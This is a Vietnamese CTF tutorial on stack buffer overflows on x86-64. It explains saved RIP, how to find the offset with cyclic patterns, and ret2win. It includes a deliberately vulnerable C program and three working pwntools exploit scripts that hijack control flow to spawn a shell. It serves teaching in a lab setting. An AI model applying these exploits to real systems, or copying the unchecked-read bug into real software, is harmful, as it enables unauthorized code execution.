Stack Buffer Overflow

Lỗ hổng gốc của pwn: một read/gets ghi quá dung lượng buffer trên stack → tràn đè lên saved RIP (địa chỉ trả về). Kiểm soát saved RIP = kiểm soát chương trình nhảy đi đâu. Bài này đi layout frame số thật + cyclic dò offset + ret2win đầy đủ.

Mức: Nền tảng (Phase 1) Binary mẫu: x86-64 no-PIE, NX, no canary Cần trước: stack, hàm asm Thời lượng: ~50 phút

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Lỗi: char buf[0x40]; read(0, buf, 0x100); — đọc 0x100 byte vào buffer 0x40 byte → tràn 0xC0 byte, đè saved rbp + saved RIP.

Khai thác: stack lưu "địa chỉ trả về" (saved RIP) để ret biết quay về đâu. Ghi đè nó = khi hàm ret, CPU nhảy tới địa chỉ ta chọn. Đơn giản nhất: nhảy tới hàm win() có sẵn (ret2win).

Offset: khoảng cách từ đầu buffer tới saved RIP — dò bằng cyclic (de Bruijn pattern).

Nếu chỉ nhớ một điều: tràn tới saved RIP, ghi địa chỉ đích; dò offset bằng cyclic. Đây là nền của MỌI kỹ thuật stack.

⚡ COMBAT CARD — dán chạy khi đang thi
🔎 Dò offset tới saved RIP 
p.sendline(cyclic(200))          # pattern de Bruijn
# crash → trong gdb:  cyclic -l $rsp   (hoặc giá trị RIP)
OFF = 72                          # ví dụ: buf[0x40] → 0x40+8(rbp)=0x48=72
🎯 ret2win (đơn giản nhất) 
payload = b"A"*OFF + p64(exe.sym.win)
p.sendline(payload)               # ret → win()
⚠️ movaps align

Nếu win gọi system/printf → cần rsp căn 0x10. Chèn 1 gadget ret: p64(ret) + p64(win).

📐 Tính OFF nhanh 
OFF = kích_thước_buf + 8(saved rbp)
# buf[0x40] (rbp-0x40): OFF = 0x40 + 8 = 0x48 = 72
# gdb chắc chắn: cyclic pattern
🚦 Bước kế theo mitigation

Không win() → ret2libc/ROP. Có canary → leak/brute. PIE → partial/leak. NX off → shellcode.

01 / NỀN TẢNG BẮT BUỘC

Stack frame & saved RIP

Khi gọi một hàm, CPU push địa chỉ lệnh kế (để biết chỗ quay về) — đó là saved RIP (return address). Hàm thiết lập frame: push rbp; mov rbp,rsp; sub rsp,N (dành chỗ biến cục bộ). Biến cục bộ (buffer) nằm ở địa chỉ THẤP hơn saved RIP. Ghi "tràn lên" (địa chỉ tăng) từ buffer sẽ chạm saved rbp rồi saved RIP. Khi hàm xong: leave; ret → ret pop saved RIP vào rip → nếu ta đã đè nó, CPU nhảy tới đích ta chọn.

buffer overflow

Ghi quá dung lượng buffer.

Địa chỉ trả về trên stack.

cyclic

Pattern de Bruijn để dò offset.

02 / VÌ SAO CÓ KỸ THUẬT

Hàm C không kiểm tra độ dài

Các hàm như gets, scanf("%s"), hay read(0, buf, N) với N > sizeof(buf) ghi dữ liệu mà không kiểm tra biên buffer. C để lập trình viên tự lo — và họ thường quên. Dữ liệu thừa tràn lên các ô stack kế, gồm saved RIP. Đây là lớp lỗ hổng lâu đời nhất (Morris worm 1988) và vẫn là cửa vào của hầu hết đề pwn: kiểm soát luồng thực thi từ một input đơn giản.

04 / DÒ OFFSET

cyclic — pattern không lặp

cyclic(n) tạo chuỗi de Bruijn: mỗi 4 (hoặc 8) byte liên tiếp là duy nhất. Khi crash, giá trị trong rsp/RIP là 1 đoạn của chuỗi → cyclic -l tra ngược ra vị trí → chính là offset.

>>> p.sendline(cyclic(200))        # gửi "aaaabaaacaaad..."
# chương trình crash (SIGSEGV tại địa chỉ 0x6161...)
pwndbg> cyclic -l 0x6161616161616166   # hoặc giá trị rsp
72                                 # → OFFSET = 72
Tính tayVới buf[0x40] tại rbp-0x40: offset = 0x40 (buf) + 0x8 (saved rbp) = 0x48 = 72. Nếu compiler thêm padding/canary thì khác — cyclic chắc ăn hơn tính tay.
05 / TỰ TAY THỬ

Trượt thanh — thấy khi nào chạm saved RIP

Kéo số byte ghi vào. Khi đủ 72 byte, byte kế tràn vào saved RIP → kiểm soát luồng.

07 / EXPLOIT ĐẦY ĐỦ

ret2win (số thật)

// vuln.c — gcc vuln.c -o vuln -fno-stack-protector -no-pie
void win(){ system("/bin/sh"); }           // hàm "thắng" có sẵn
int main(){ char buf[0x40]; read(0, buf, 0x100); }   // overflow
# BẢN A — dò offset + ret2win. Số thật.
from pwn import *
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

OFF = 72                          # dò bằng cyclic (0x40 buf + 8 rbp)
payload  = b"A"*OFF
payload += p64(exe.sym.win)         # 0x401176 → saved RIP
p.sendline(payload)
p.interactive()                     # shell!
Thành thậtOFF=72 là của binary mẫu (buf 0x40). Của bạn dò bằng cyclic (đừng tính tay nếu có canary/padding). exe.sym.win tự lấy địa chỉ win (no-PIE cố định).
# BẢN B — win gọi system → cần căn rsp 0x10 (movaps).
from pwn import *
context.binary = exe = ELF("./vuln", checksec=False)
p = process(exe.path)
OFF = 72
ret = ROP(exe).find_gadget(["ret"])[0]   # gadget ret trơn
payload = b"A"*OFF + p64(ret) + p64(exe.sym.win)   # căn 0x10 rồi win
p.sendline(payload)
p.interactive()
movapsNếu ret2win vào hàm gọi system/printf mà crash ngay trong đó → rsp lệch 0x10. Thêm 1 gadget ret trước win để dịch stack 8 byte. (xem ret2libc §movaps.)
# BẢN C — pwnld.
from pwnld import *
exe = ELF("./vuln", checksec=False); p = start()
sl(b"A"*72 + p64(exe.sym.win)); ia()
